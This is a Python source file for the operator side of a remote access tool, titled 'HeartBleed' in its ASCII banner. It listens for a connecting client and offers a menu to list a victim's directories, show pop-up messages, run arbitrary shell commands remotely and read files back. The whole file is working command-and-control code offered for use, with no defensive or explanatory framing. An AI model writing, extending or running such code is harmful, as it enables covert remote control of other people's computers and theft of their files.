import socket
import sys
import os
import ast
from colorama import Fore, init

init(convert=True)

ip = sys.argv[1]
port = sys.argv[2]

s = socket.socket()

conn = ""
addr = ""

banner = f"""



    
    {Fore.RED}██╗  ██╗███████╗ █████╗ ██████╗ ████████╗██████╗ ██╗     ███████╗███████╗██████╗ 
    {Fore.LIGHTRED_EX}██║  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     ██╔════╝██╔════╝██╔══██╗
    {Fore.RED}███████║█████╗  ███████║██████╔╝   ██║   ██████╔╝██║     █████╗  █████╗  ██║  ██║
    {Fore.LIGHTRED_EX}██╔══██║██╔══╝  ██╔══██║██╔══██╗   ██║   ██╔══██╗██║     ██╔══╝  ██╔══╝  ██║  ██║
    {Fore.RED}██║  ██║███████╗██║  ██║██║  ██║   ██║   ██████╔╝███████╗███████╗███████╗██████╔╝
    {Fore.LIGHTRED_EX}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═════╝ 



"""

format = f"     {Fore.LIGHTBLACK_EX}[{Fore.LIGHTMAGENTA_EX}!{Fore.LIGHTBLACK_EX}] {Fore.LIGHTBLUE_EX}"

def reset():
    global s
    global conn
    global addr

    s = socket.socket()
    conn = ""
    addr = ""

def clear():
    os.system("cls")

def reload():
    reset()
    clear()
    print(banner)
    bind_server()
    commandHQ()

def bind_server():
    global conn
    global addr

    s.bind((str(ip), int(port)))

    print(format + "Successfully binded to client! Now listening..")

    s.listen()

    print(format + "Successfully started listening to client! Now reversing TCP Proxy..")

    conn,addr = s.accept()

    print(format + "Successfully connected to client, IP: " + str(ip) + " on Port: "+ str(port))

def commandHQ():
    global conn
    global addr

    while True:

        command = input(format)

        ans = False # Update github repo

        if command == "clear" or command == "cl":
            clear()
            print(banner)
            commandHQ()

        if command == "1":
            try:
                dir_path = input(format + "Enter directory: ")

                message = str(["vfisd", dir_path])
                message = message.encode()

                conn.send(message)
            
                ans = True
            except:
                reload()

        if command == "2":
            try:
                title = input(format + "Enter title: ")
                message = input(format + "Enter message: ")

                message = str(["smbwm", message, title])
                message = message.encode()

                conn.send(message)
                ans = True
            except:
                reload()

        if command == "3":
            try:
                command = input(format + "Enter command: ")

                message = str(["ewc", command])
                message = message.encode()
                
                conn.send(message)
                ans = True
            except:
                reload()

        if command == "4":
            try:
                path = input(format + "Enter path: ")

                message = str(["rtf", path])
                message = message.encode()

                conn.send(message)
                ans = True
            except:
                reload()


        if(ans == False): commandHQ()

        if(conn.recv):

            incoming_message = conn.recv(102400)
            incoming_message = incoming_message.decode()
            incoming_message = ast.literal_eval(incoming_message)

            if incoming_message[0] == "vfisd": # 1
                print(format + "Data received: {}".format(incoming_message[1]))

            if incoming_message[0] == "smbwm": # 2
                print(format + "Data received: {}".format(incoming_message[1]))

            if incoming_message[0] == "ewc": # 3
                print(format + "Data received: {}".format(incoming_message[1]))
                
            if incoming_message[0] == "rtf": # 4
                print(format + "Data received: {}".format(incoming_message[1]))

clear()
print(banner)
bind_server()
commandHQ()